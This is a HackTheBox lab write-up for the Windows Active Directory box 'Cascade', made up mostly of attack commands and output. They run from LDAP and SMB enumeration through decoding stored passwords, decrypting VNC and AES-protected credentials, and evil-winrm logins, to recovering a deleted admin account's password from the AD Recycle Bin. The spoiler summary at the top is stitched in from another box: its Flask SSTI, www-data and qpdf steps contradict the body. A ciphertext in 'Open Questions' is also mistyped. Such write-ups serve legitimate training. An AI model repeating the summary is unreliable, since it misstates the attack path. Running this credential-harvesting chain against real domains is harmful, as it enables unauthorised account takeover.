---
tags:
  - hack
  - windows
---
# HackTheBox: [Cascade](https://app.hackthebox.com/machines/Cascade)

> [!tip]- Summary with Spoilers
> - **Initial Enumeration and Discovery**: The box hosts a Flask web application with a contact form vulnerable to `XSS`. Using crafted payloads, this was escalated to a SSTI vulnerability for RCE.
> - **Remote Code Execution**: Injecting malicious payloads into the vulnerable SSTI endpoint allowed code execution, providing a foothold as the `www-data` user.
> - **Privilege Escalation via `qpdf`**: Exploiting `sudo` permissions to execute `qpdf`, sensitive files (e.g., `/root/.ssh/id_rsa`) were read.
> - This Active Directory environment exposed sensitive credentials in an LDAP attribute, which I used to access hidden SMB shares.
> - I found additional credentials in the SMB shares and used them to access a backup database, decrypting a stored password for the `ArkSvc` service account.
> - I escalated privileges to `Administrator` by recovering a deleted user’s password from Active Directory’s Recycle Bin.

## Services

### TCP

```console
# Nmap 7.94SVN scan initiated Tue Sep 10 10:06:21 2024 as: nmap -v --reason -Pn -T4 --min-rate 10000 -p- --open -sCV -oN nmap_tcp-cascade.htb.txt cascade.htb
Increasing send delay for 10.10.10.182 from 0 to 5 due to 11 out of 18 dropped probes since last increase.
Nmap scan report for cascade.htb (10.10.10.182)
Host is up, received user-set (0.18s latency).
rDNS record for 10.10.10.182: t
Not shown: 65521 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE    REASON          VERSION
53/tcp    open  domain     syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped syn-ack ttl 127
135/tcp   open  tcpwrapped syn-ack ttl 127
139/tcp   open  tcpwrapped syn-ack ttl 127
389/tcp   open  ldap       syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  tcpwrapped syn-ack ttl 127
636/tcp   open  tcpwrapped syn-ack ttl 127
3268/tcp  open  tcpwrapped syn-ack ttl 127
5985/tcp  open  tcpwrapped syn-ack ttl 127
49154/tcp open  msrpc      syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  unknown    syn-ack ttl 127
49157/tcp open  tcpwrapped syn-ack ttl 127
49158/tcp open  tcpwrapped syn-ack ttl 127
49165/tcp open  tcpwrapped syn-ack ttl 127
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-09-10T16:08:05
|_  start_date: 2024-09-10T15:57:16

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 10 10:10:14 2024 -- 1 IP address (1 host up) scanned in 232.48 seconds
```

#### 445/tcp-tcpwrapped

`enum4linux-ng`:

```console
[+] After merging OS information we have the following result:
OS: Windows 7, Windows Server 2008 R2
OS version: '6.1'
OS build: '7601'
...
```

Checking for EternalBlue:

```console
[*] Started reverse TCP handler on 10.10.14.13:443
[*] 10.10.10.182:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 10.10.10.182:445      - An SMB Login Error occurred while connecting to the IPC$ tree.
[*] 10.10.10.182:445      - Scanned 1 of 1 hosts (100% complete)
[-] 10.10.10.182:445 - The target is not vulnerable.
```

#### 636/tcp-tcpwrapped

```console
$ ldapsearch -x -H ldap://t -b "DC=CASCADE,DC=LOCAL" -D '' -w '' sAMAccountName servicePrincipalName
...
# CASC-DC1, Domain Controllers, cascade.local
dn: CN=CASC-DC1,OU=Domain Controllers,DC=cascade,DC=local
sAMAccountName: CASC-DC1$
servicePrincipalName: TERMSRV/CASC-DC1
servicePrincipalName: TERMSRV/CASC-DC1.cascade.local
servicePrincipalName: ldap/CASC-DC1.cascade.local/ForestDnsZones.cascade.local
servicePrincipalName: ldap/CASC-DC1.cascade.local/DomainDnsZones.cascade.local
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/CASC-DC1.casca
 de.local
servicePrincipalName: DNS/CASC-DC1.cascade.local
servicePrincipalName: GC/CASC-DC1.cascade.local/cascade.local
servicePrincipalName: RestrictedKrbHost/CASC-DC1.cascade.local
servicePrincipalName: RestrictedKrbHost/CASC-DC1
servicePrincipalName: HOST/CASC-DC1/CASCADE
servicePrincipalName: HOST/CASC-DC1.cascade.local/CASCADE
servicePrincipalName: HOST/CASC-DC1
servicePrincipalName: HOST/CASC-DC1.cascade.local
servicePrincipalName: HOST/CASC-DC1.cascade.local/cascade.local
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/8bfc9a6c-6edc-45bd-
 9e27-251f9de2d5f7/cascade.local
servicePrincipalName: ldap/CASC-DC1/CASCADE
servicePrincipalName: ldap/8bfc9a6c-6edc-45bd-9e27-251f9de2d5f7._msdcs.cascade
 .local
servicePrincipalName: ldap/CASC-DC1.cascade.local/CASCADE
servicePrincipalName: ldap/CASC-DC1
servicePrincipalName: ldap/CASC-DC1.cascade.local
servicePrincipalName: ldap/CASC-DC1.cascade.local/cascade.local
...
```

```console
$ grep sAMAccountName ldapsearch.txt |awk '{print $2}'|grep '^[a-z]\.' | tee users.txt
s.smith
r.thompson
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
j.allen
i.croft
```

## Remote Code Execution

I tried brute-forcing passwords for the username I found, but with no luck. So, I reviewed the LDAP dump again, and found this:

```text
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
...
cascadeLegacyPwd: clk0bjVldmE=
```

Which is just Base64:

```console
$ echo 'clk0bjVldmE=' |base64 -d
rY4n5eva
```

And, it works:

```console
$ nxc smb cascade.htb -u r.thompson -p 'rY4n5eva'
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
```

```console
$ nxc smb cascade.htb -u r.thompson -p 'rY4n5eva' --shares
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
SMB         10.10.10.182    445    CASC-DC1         [*] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
```

```console
smb: \IT\> cd "Email Archives"
lsmb: \IT\Email Archives\> ls
  .                                   D        0  Tue Jan 28 12:00:30 2020
  ..                                  D        0  Tue Jan 28 12:00:30 2020
  Meeting_Notes_June_2018.html       An     2522  Tue Jan 28 12:00:12 2020

                6553343 blocks of size 4096. 1624628 blocks available
smb: \IT\Email Archives\> get Meeting_Notes_June_2018.html
```

From the email:

```text
We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password).
```

Interesting, although I don't see an account named `TempAdmin` in the LDAP dump.

```console
smb: \IT\Logs\Ark AD Recycle Bin\> ls
  .                                   D        0  Fri Jan 10 10:33:45 2020
  ..                                  D        0  Fri Jan 10 10:33:45 2020
  ArkAdRecycleBin.log                 A     1303  Tue Jan 28 19:19:11 2020

                6553343 blocks of size 4096. 1624886 blocks available
smb: \IT\Logs\Ark AD Recycle Bin\> get ArkAdRecycleBin.log
```

```text
1/10/2018 15:43 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD] Validating settings...
1/10/2018 15:43 [MAIN_THREAD] Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD] Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD] Validating settings...
2/10/2018 15:56 [MAIN_THREAD] Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD] Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD] Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD] Exiting with error code 0
8/12/2018 12:22 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD] Validating settings...
8/12/2018 12:22 [MAIN_THREAD] Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD] Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD] Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD] Exiting with error code 0
```

Hmm:

```console
$ impacket-GetUserSPNs  cascade.local/r.thompson -dc-ip 10.10.10.182
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
No entries found!
```

```console
$ bloodhound-python -u r.thompson -p rY4n5eva -c all  -ns 10.10.10.182 -d cascade.local
INFO: Found AD domain: cascade.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: casc-dc1.cascade.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: casc-dc1.cascade.local
INFO: Found 18 users
INFO: Found 53 groups
INFO: Found 7 gpos
INFO: Found 6 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: CASC-DC1.cascade.local
INFO: Done in 00M 18S
```

```console
$ file VNC\ Install.reg
VNC Install.reg: Windows Registry little-endian text (Win2K or above)

$ dos2unix VNC\ Install.reg
dos2unix: converting UTF-16LE file VNC Install.reg to UTF-8 Unix format...

$ grep Pass VNC\ Install.reg
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

This can be decrypted from a known AES key:

```ruby
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

>> key = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\x17Rk\x06#NX\a"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), key
=> "sT333ve2"
```

```console
$ nxc smb cascade.htb -u s.smith -p sT333ve2
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2
```

```powershell
$ evil-winrm -i cascade.htb -u s.smith -p sT333ve2

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

## Privilege Escalation

```powershell
*Evil-WinRM* PS C:\Shares\Audit> ./CascAudit.exe DB/Audit.db
Found 2 results from LDAP query
CascAudit.exe :
    + CategoryInfo          : NotSpecified: (:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Unhandled Exception: System.Data.SQLite.SQLiteException: attempt to write a readonly database
attempt to write a readonly database
   at System.Data.SQLite.SQLite3.Reset(SQLiteStatement stmt)
   at System.Data.SQLite.SQLite3.Step(SQLiteStatement stmt)
   at System.Data.SQLite.SQLiteDataReader.NextResult()
   at System.Data.SQLite.SQLiteDataReader..ctor(SQLiteCommand cmd, CommandBehavior behave)
   at System.Data.SQLite.SQLiteCommand.ExecuteReader(CommandBehavior behavior)
   at System.Data.SQLite.SQLiteCommand.ExecuteNonQuery(CommandBehavior behavior)
   at CascAudiot.MainModule.Main()
Successfully inserted 0 row(s) into database

*Evil-WinRM* PS C:\Shares\Audit> Copy-Item C:\Shares\Audit -Destination C:\Users\s.smith\Audit -Recurse
```

```sqlite
$ sqlite3 Audit.db
SQLite version 3.46.0 2024-05-23 13:25:27
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap              Misc
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
sqlite> select * from DeletedUserAudit;
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
11|CASC-WS1$|CASC-WS1
DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe|CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
12|TempAdmin|TempAdmin
DEL:f0cc344d-31e0-4866-bceb-a842791ca059|CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
sqlite> select * from Misc;
sqlite>
```

I want to decompile the binaries I found in the Audit share, so I can decrypt the password found in the `sqlite3` database. I'll use [ILSpy](using-ilspy-20240911.md) to do this.

```console
$ ./ICSharpCode.ILSpyCmd/bin/Debug/net8.0/ilspycmd ~/htb-cascade/CascCrypto.dll
...
```

And this gives me what I need:

```csharp
public static string EncryptString(string Plaintext, string Key)
{
        byte[] bytes = Encoding.UTF8.GetBytes(Plaintext);
        Aes aes = Aes.Create();
        aes.BlockSize = 128;
        aes.KeySize = 128;
        aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
        aes.Key = Encoding.UTF8.GetBytes(Key);
        aes.Mode = CipherMode.CBC;
        using MemoryStream memoryStream = new MemoryStream();
        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
        {
                cryptoStream.Write(bytes, 0, bytes.Length);
                cryptoStream.FlushFinalBlock();
        }
        return Convert.ToBase64String(memoryStream.ToArray());
}

...

string encryptedString = Conversions.ToString(val3["Pwd"]);
try
{
        password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
}
```

As always, [CyberChef](https://gchq.github.io/) is really useful!

```powershell
$ evil-winrm -i cascade.htb -u ArkSvc -p w3lc0meFr31nd
...
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

WinPEAS:

```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry
È Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\Dnscache (Users [CreateSubKey])
    HKLM\system\currentcontrolset\services\RpcEptMapper (Authenticated Users [CreateSubKey], Users [CreateSubKey])

...
ÉÍÍÍÍÍÍÍÍÍÍ¹ Autorun Applications
È Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows-ha
rdening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
...
    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================

    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================

```

```powershell
*Evil-WinRM* PS C:\Users\arksvc> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```powershell
*Evil-WinRM* PS C:\Users\arksvc> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * > deleted.txt
*Evil-WinRM* PS C:\Users\arksvc> download deleted.txt

Info: Downloading C:\Users\arksvc\deleted.txt to deleted.txt
Info: Download successful!
```

```console
$ echo YmFDVDNyMWFOMDBkbGVz |base64 -d
baCT3r1aN00dles
```

```powershell
$ evil-winrm -i cascade.htb -u Administrator -p baCT3r1aN00dles

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cascade\administrator
```

## After `root`

This was also useful:

```console
$ ldapdomaindump -u 'cascade.local\r.thompson' -p rY4n5eva -n 10.10.10.182 cascade.htb
```

## Open Questions

Unresolved issues encountered while attacking this target.

Why doesn't this work for decrypting the password?:

```console
echo 'BQ0515Kj9MdErXx6Q6AG0w==' | openssl enc -d  -base64 -pass pass:c4scadek3y654321 -iv $(echo -n '1tdyjCbY1Ix49842' | xxd -p) -aes-256-cbc
```

## Credits

Thanks to [IBYf0r3ns1cs](https://medium.com/@idanbt1993/hackthebox-cascade-walkthrough-d39091d63028) for tips on PrivEsc.
